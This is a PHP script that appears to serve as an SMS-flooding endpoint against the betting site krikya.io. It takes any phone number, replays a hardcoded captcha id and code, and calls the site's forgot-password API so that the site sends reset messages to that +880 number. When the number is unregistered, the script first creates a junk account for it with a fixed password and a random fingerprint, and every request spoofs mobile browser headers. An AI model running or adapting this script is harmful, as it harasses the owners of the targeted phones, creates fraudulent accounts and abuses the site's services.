<?php

const API_URL = "https://www.krikya.io/api";
const ORIGIN_URL = "https://www.krikya.io";
const CAPTCHA_ID = "a7c7a5d2-1e2b-4a61-8fc5-dcdd5db3eee3";
const CAPTCHA_CODE = "4892";

function generateRandomString($length = 8) {
    return substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, $length);
}
function generateRandomHex($length = 32) {
    return bin2hex(random_bytes($length / 2));
}
function registerMember($phone) {
    $url = API_URL . "/member";
    $pass = generateRandomString();
    $data = [
        "membercode" => $pass,
        "password" => "4Pw3yUrQKu2v",
        "currency" => "BDT",
        "email" => "",
        "registration_site" => "mobile",
        "mobile" => $phone,
        "line" => "",
        "referral_code" => "",
        "is_early_bird" => "0",
        "domain" => ORIGIN_URL,
        "language" => "en",
        "verification_code" => "",
        "reg_type" => 2,
        "agent_team" => "",
        "utm_source" => null,
        "utm_medium" => null,
        "utm_campaign" => null,
        "s2" => null,
        "fp" => generateRandomHex(),
        "pid" => null,
        "c_id" => null
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2TLS);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "Accept: application/json, text/plain, */*",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
        "Origin: " . ORIGIN_URL,
        "Referer: " . ORIGIN_URL . "/"
    ]);

    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function captcha() {
    $url = API_URL . "/member/requestCaptchaCode?captcha_id=" . CAPTCHA_ID . "&captcha_code=" . CAPTCHA_CODE;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2TLS);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "sec-ch-ua-platform: \"Android\"",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
        "Accept: application/json, text/plain, */*",
        "sec-ch-ua: \"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
        "sec-ch-ua-mobile: ?1",
        "Origin: " . ORIGIN_URL,
        "Sec-Fetch-Site: cross-site",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: " . ORIGIN_URL . "/",
        "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8",
        "Priority: u=1, i"
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function requestForgotPassword($mobile, $prefix, $captcha_id, $captcha_code) {
    $url = API_URL . "/member/reqFgtPsw";
    $data = [
        "mobile" => $mobile,
        "prefix" => $prefix,
        "captcha_id" => $captcha_id,
        "captcha_code" => $captcha_code
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2TLS);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Host: " . parse_url(API_URL, PHP_URL_HOST),
        "Content-Length: " . strlen(json_encode($data)),
        "sec-ch-ua-platform: \"Android\"",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
        "Accept: application/json, text/plain, */*",
        "sec-ch-ua: \"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
        "Content-Type: application/json",
        "sec-ch-ua-mobile: ?1",
        "Origin: " . ORIGIN_URL,
        "Sec-Fetch-Site: cross-site",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: " . ORIGIN_URL . "/",
        "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8",
        "Priority: u=1, i"
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function zeroUnading(string $phone): string {
    return ltrim($phone, '0');
}

$res = [];
header('Content-type: application/json; charset: utf-8');

if (isset($_GET['phone']) && !empty($_GET['phone'])) {
    $chech = captcha();
    if ($chech) {
        $cap_de = json_decode($chech, true);
        if (isset($cap_de['success'])) {
            $num = zeroUnading($_GET['phone']);
            if ($num) {
                $call = requestForgotPassword($num, "+880", CAPTCHA_ID, CAPTCHA_CODE);
                $call_de = json_decode($call, true);
                if (isset($call_de['success']) && $call_de['success'] == true) {
                    $res['result'] = $call_de;
                } elseif (isset($call_de['code']) && $call_de['code'] == '3.692') {
                    $res['msg'] = $call_de;
                } else {
                    $regis = registerMember($num);
                      $call = requestForgotPassword($num, "+880", CAPTCHA_ID, CAPTCHA_CODE);
                    $res['msg'] = json_decode($regis, true);
                }
            } else {
                $res['msg'] = 'phone 0 error';
            }
        } else {
            $res['msg'] = 'captcha code not generate';
            $res['msg2'] = $cap_de;
        }
    } else {
        $res['msg'] = 'Captcha function error';
    }
} else {
    $res['status'] = false;
    $res['msg'] = 'input field empty!';
}

die(json_encode($res, JSON_PRETTY_PRINT));
?>